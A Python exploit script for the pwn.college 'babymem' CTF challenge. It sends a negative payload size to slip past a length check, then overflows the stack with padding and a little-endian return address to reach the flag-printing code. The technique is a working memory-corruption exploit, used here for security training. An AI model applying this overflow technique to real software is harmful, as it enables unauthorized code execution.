import subprocess as sp
import sys
from   time import sleep

prompt1_string = 'Payload size:'
prompt2_string = 'Send your payload (up to'
success_string = 'pwn.college'
fail_string1   = 'Goodbye!'
fail_string2   = 'ERROR: Failed to read input -- Bad address!'

def terminated_read( fd, terminators ):
    buf = []
    while True:
        r = fd.read( 1 ).decode('utf-8')
        buf += r
        if r in terminators:
            break;
    return ''.join( buf )

def submit_input( process, in_val ):
    print( in_val )
    process.stdin.write( in_val )
    process.stdin.flush()

def read_prompt( process, prompt, terminator ):
    output = ''

    while prompt not in output:
        output = terminated_read( process.stdout, terminator ).strip()
        print( output )

    return True

if __name__ == '__main__':
    app = ['/challenge/babymem_level4.1']
    #app = ['nc', 'mars.picoctf.net', '31890']

    # Communicate with the subprocess
    proc = sp.Popen(app, shell=False, bufsize=0,
                    stdin = sp.PIPE,
                    stdout = sp.PIPE,
                    stderr = sp.PIPE)

    # This converts a hex number to a little-endian byte string
    n = 0x401363
    n = n.to_bytes( ( n.bit_length() + 7 ) // 8, 'little' ) or b'\0'

    # This overflows the stack, then overwrites the check that compares a variable against "0xdeadbeef"
    submit_input( proc, b'-190' )
    read_prompt( proc, prompt1_string, ':' )
    submit_input( proc, b'a' * 137 + n )
    read_prompt( proc, prompt2_string, '!' )

    output = ''
    while success_string not in output and fail_string1 not in output and fail_string2 not in output:
        output += proc.stdout.read( 100 ).decode('utf-8')
        print( output )
        sleep( 1 )